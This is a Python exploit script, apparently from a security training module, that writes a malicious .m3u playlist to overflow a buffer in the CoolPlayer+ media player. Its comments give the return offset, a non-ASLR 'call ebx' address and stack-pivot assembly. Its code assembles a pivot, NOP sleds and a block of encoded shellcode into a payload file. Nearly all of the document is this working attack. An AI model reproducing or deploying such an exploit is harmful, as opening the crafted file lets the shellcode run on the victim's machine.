# Author: Uday Mittal
# Company: Yaksas CSC
# Contact: csc@yaksas.in | twitter.com/yaksas443

# badchar for shellcode = '\x00'
#   0x00404ff5 : call ebx | startnull {PAGE_EXECUTE_READWRITE} [coolplayer+.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\ptlabmachine\Desktop\CoolPlayer+Portable\App\CoolPlayer+\coolplayer+.exe)
# EIP offset: 230 - This offset is dependent on the location of .m3u file. In this module I have it on the Desktop
# E926010000 jmp $+299
#
# STACK PIVOTING CODE
#
# Save stack pointer
# 0156E08A   8BC4             	MOV EAX,ESP
#
# Carve out long jump
# 0156E08C   53                 PUSH EBX
# 0156E08D   5C                 POP ESP
# 0156E08E   83C4 40         	ADD ESP,40
# 0156E091   51                 PUSH ECX
# 0156E092   66:81C1 2601     	ADD CX,126
# 0156E097   66:51            	PUSH CX
# 0156E099   66:81C1 6AE8     	ADD CX,0E86A
# 0156E09E   66:51            	PUSH CX
#
# Restore stack
# 0156E2FA   50                 PUSH EAX
# 0156E2FB   5C                 POP ESP



filename = "martin-songs.m3u"

buf =  b""
buf += b"\xbf\x35\x85\x9d\x8c\xdd\xc0\xd9\x74\x24\xf4\x58\x33"
buf += b"\xc9\xb1\x56\x83\xc0\x04\x31\x78\x0f\x03\x78\x3a\x67"
buf += b"\x68\x70\xac\xe5\x93\x89\x2c\x8a\x1a\x6c\x1d\x8a\x79"
buf += b"\xe4\x0d\x3a\x09\xa8\xa1\xb1\x5f\x59\x32\xb7\x77\x6e"
buf += b"\xf3\x72\xae\x41\x04\x2e\x92\xc0\x86\x2d\xc7\x22\xb7"
buf += b"\xfd\x1a\x22\xf0\xe0\xd7\x76\xa9\x6f\x45\x67\xde\x3a"
buf += b"\x56\x0c\xac\xab\xde\xf1\x64\xcd\xcf\xa7\xff\x94\xcf"
buf += b"\x46\x2c\xad\x59\x51\x31\x88\x10\xea\x81\x66\xa3\x3a"
buf += b"\xd8\x87\x08\x03\xd5\x75\x50\x43\xd1\x65\x27\xbd\x22"
buf += b"\x1b\x30\x7a\x59\xc7\xb5\x99\xf9\x8c\x6e\x46\xf8\x41"
buf += b"\xe8\x0d\xf6\x2e\x7e\x49\x1a\xb0\x53\xe1\x26\x39\x52"
buf += b"\x26\xaf\x79\x71\xe2\xf4\xda\x18\xb3\x50\x8c\x25\xa3"
buf += b"\x3b\x71\x80\xaf\xd1\x66\xb9\xed\xbd\x4b\xf0\x0d\x3d"
buf += b"\xc4\x83\x7e\x0f\x4b\x38\xe9\x23\x04\xe6\xee\x32\x02"
buf += b"\x19\x20\xfc\x43\xe7\xc1\xfc\x4a\x2c\x95\xac\xe4\x85"
buf += b"\x96\x27\xf5\x2a\x43\xdd\xff\xbc\xac\x89\x7a\x53\x45"
buf += b"\xcb\x7a\xba\xc9\x42\x9c\xec\xa1\x04\x31\x4d\x12\xe4"
buf += b"\xe1\x25\x78\xeb\xde\x56\x83\x26\x77\xfc\x6c\x9e\x2f"
buf += b"\x69\x14\xbb\xa4\x08\xd9\x16\xc1\x0b\x51\x92\x35\xc5"
buf += b"\x92\xd7\x25\x32\xc5\x17\xb6\xc3\x60\x17\xdc\xc7\x22"
buf += b"\x40\x48\xca\x13\xa6\xd7\x35\x76\xb5\x10\xc9\x07\x8f"
buf += b"\x6b\xfc\x9d\xaf\x03\x01\x72\x2f\xd4\x57\x18\x2f\xbc"
buf += b"\x0f\x78\x7c\xd9\x4f\x55\x11\x72\xda\x56\x43\x26\x4d"
buf += b"\x3f\x69\x11\xb9\xe0\x92\x74\xb9\xe7\x6c\x0a\x96\x4f"
buf += b"\x04\xf4\xa6\x6f\xd4\x9e\x26\x20\xbc\x55\x08\xcf\x0c"
buf += b"\x95\x83\x98\x04\x1c\x42\x6a\xb5\x21\x4f\x2a\x6b\x21"
buf += b"\x7c\xf7\x9c\x58\x0d\x08\x5d\x9d\x07\x6d\x5e\x9d\x27"
buf += b"\x93\x63\x4b\x1e\xe1\xa2\x4f\x25\xfa\x91\xf2\x0c\x91"
buf += b"\xd9\xa1\x4f\xb0"

stackpivot = "\x8B\xc4\x53\x5c\x83\xc4\x40\x51\x66\x81\xC1\x26\x01\x66\x51\x66\x81\xC1\x6A\xE8\x66\x51"

evilString =  "\x90"*10 + stackpivot + "\x90"*198 + "\xf5\x4f\x40\x00" + "\x90"*200 + "\x50\x5c" + "\x90"* 100 + buf + "\x90"*1436


file = open(filename,'w')
file.write(evilString)
file.close()
